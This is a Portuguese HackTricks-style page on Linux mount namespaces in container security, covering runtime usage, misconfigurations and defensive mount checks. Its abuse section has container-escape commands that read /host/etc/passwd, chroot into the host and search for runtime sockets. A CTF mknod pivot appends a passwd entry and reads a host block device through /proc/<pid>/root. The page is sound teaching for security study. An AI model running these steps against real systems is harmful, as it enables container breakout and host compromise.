# Namespace de montagem

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de montagem controla a **tabela de montagens** que um processo vê. Esse é um dos recursos mais importantes de isolamento de containers, porque o sistema de arquivos raiz, os bind mounts, os mounts de tmpfs, a visão do procfs, a exposição do sysfs e muitos mounts auxiliares específicos do runtime são todos expressos por meio dessa tabela de montagens. Dois processos podem acessar `/`, `/proc`, `/sys` ou `/tmp`, mas o destino desses caminhos depende do namespace de montagem em que estão.

Do ponto de vista da segurança de containers, o namespace de montagem costuma ser a diferença entre "este é um sistema de arquivos de aplicação cuidadosamente preparado" e "este processo pode visualizar ou influenciar diretamente o sistema de arquivos do host". É por isso que bind mounts, volumes `hostPath`, operações de montagem privilegiadas e exposições graváveis de `/proc` ou `/sys` estão todos relacionados a esse namespace.

## Operação

Quando um runtime inicia um container, ele geralmente cria um namespace de montagem novo, prepara um sistema de arquivos raiz para o container, monta o procfs e outros sistemas de arquivos auxiliares conforme necessário e, em seguida, adiciona opcionalmente bind mounts, mounts de tmpfs, secrets, config maps ou host paths. Depois que o processo está em execução dentro do namespace, o conjunto de mounts que ele vê fica amplamente desacoplado da visão padrão do host. O host ainda pode ver o sistema de arquivos subjacente real, mas o container vê a versão montada para ele pelo runtime.

Isso é poderoso porque permite que o container acredite que possui seu próprio sistema de arquivos raiz, embora o host ainda esteja gerenciando tudo. Também é perigoso porque, se o runtime expuser o mount errado, o processo poderá obter visibilidade sobre recursos do host que o restante do modelo de segurança talvez não tenha sido projetado para proteger.

## Lab

Você pode criar um namespace de montagem privado com:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagens, verá que a montagem tmpfs existe apenas dentro do namespace de montagem isolado. Este é um exercício útil porque mostra que o isolamento de montagens não é uma teoria abstrata; o kernel está literalmente apresentando uma tabela de montagens diferente ao processo.
Se você abrir outro shell fora desse namespace e inspecionar a tabela de montagens, a montagem tmpfs existirá apenas dentro do namespace de montagem isolado.

Dentro de containers, uma comparação rápida é:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
O segundo exemplo demonstra como é fácil para uma configuração de runtime abrir uma enorme brecha através do limite do filesystem.

## Uso do Runtime

Docker, Podman, stacks baseadas em containerd e CRI-O dependem de um mount namespace privado para containers normais. O Kubernetes se baseia no mesmo mecanismo para volumes, secrets projetados, config maps e mounts `hostPath`. Ambientes Incus/LXC também dependem bastante de mount namespaces, especialmente porque system containers geralmente expõem filesystems mais ricos e semelhantes aos de uma máquina do que os application containers.

Isso significa que, ao revisar um problema no filesystem de um container, normalmente você não está analisando uma particularidade isolada do Docker. Você está analisando um problema de mount namespace e configuração de runtime, expresso pela plataforma que iniciou o workload.

## Misconfigurações

O erro mais óbvio e perigoso é expor o filesystem raiz do host ou outro caminho sensível do host por meio de um bind mount, por exemplo `-v /:/host` ou um `hostPath` com permissão de escrita no Kubernetes. Nesse ponto, a pergunta deixa de ser "o container consegue escapar de alguma forma?" e passa a ser "quanto conteúdo útil do host já está diretamente visível e pode ser modificado?" Um bind mount gravável do host geralmente transforma o restante do exploit em uma simples questão de posicionamento de arquivos, uso de chroot, modificação de configurações ou descoberta do runtime socket.

Outro problema comum é expor o `/proc` ou `/sys` do host de maneiras que contornem a visão mais segura do container. Esses filesystems não são mounts de dados comuns; eles são interfaces para o estado do kernel e dos processos. Se o workload acessa diretamente as versões do host, muitas das premissas por trás do hardening de containers deixam de ser aplicadas corretamente.

As proteções somente leitura também são importantes. Um filesystem raiz somente leitura não protege magicamente um container, mas remove uma grande quantidade de espaço para staging do atacante e dificulta a persistência, o posicionamento de helper binaries e a adulteração de configurações. Por outro lado, uma raiz gravável ou um bind mount gravável do host oferece ao atacante espaço para preparar a próxima etapa.

## Abuso

Quando o mount namespace é utilizado de forma incorreta, os atacantes normalmente fazem uma destas quatro coisas. Eles **leem dados do host** que deveriam ter permanecido fora do container. Eles **modificam configurações do host** por meio de bind mounts graváveis. Eles **montam ou remontam recursos adicionais** se as capabilities e o seccomp permitirem. Ou **alcançam sockets privilegiados e diretórios de estado do runtime** que permitem solicitar mais acesso à própria plataforma de containers.

Se o container já consegue visualizar o filesystem do host, o restante do modelo de segurança muda imediatamente.

Quando você suspeitar de um bind mount do host, primeiro confirme o que está disponível e se pode ser modificado:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Se o sistema de arquivos raiz do host estiver montado para leitura e escrita, o acesso direto ao host geralmente é tão simples quanto:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Se o objetivo for acesso privilegiado ao runtime em vez de chrooting direto, enumere sockets e o estado do runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Se `CAP_SYS_ADMIN` estiver presente, teste também se novos mounts podem ser criados de dentro do container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Exemplo completo: pivot `mknod` em dois shells

Um caminho de abuso mais especializado surge quando o usuário root do container pode criar block devices, o host e o container compartilham uma identidade de usuário de forma útil e o atacante já possui um foothold de baixo privilégio no host. Nessa situação, o container pode criar um device node como `/dev/sda`, e o usuário de baixo privilégio do host pode posteriormente lê-lo por meio de `/proc/<pid>/root/` usando o processo correspondente do container.<sup>[[1]](#references)</sup>

Dentro do container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
A partir do host, como o usuário de poucos privilégios correspondente após localizar o PID do shell do container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
A lição importante não é a busca exata pela string do CTF. O ponto é que a exposição do mount namespace por meio de `/proc/<pid>/root/` pode permitir que um usuário do host reutilize device nodes criados pelo container, mesmo quando a política de dispositivos do cgroup impediu o uso direto dentro do próprio container.<sup>[[1]](#references)</sup>

## Verificações

Estes comandos servem para mostrar a visão do filesystem na qual o processo atual está realmente sendo executado. O objetivo é identificar mounts derivados do host, caminhos sensíveis com permissão de escrita e qualquer coisa que pareça mais ampla do que o root filesystem de um container de aplicação normal.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
O que é interessante aqui:

- Bind mounts do host, especialmente `/`, `/proc`, `/sys`, diretórios de estado do runtime ou locais de sockets, devem chamar atenção imediatamente.
- Montagens inesperadas de leitura e escrita geralmente são mais importantes do que um grande número de montagens auxiliares somente leitura.
- `mountinfo` costuma ser o melhor lugar para verificar se um caminho realmente é derivado do host ou baseado em overlay.

Essas verificações estabelecem **quais recursos estão visíveis neste namespace**, **quais são derivados do host** e **quais podem ser gravados ou são sensíveis à segurança**.

## Referências

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
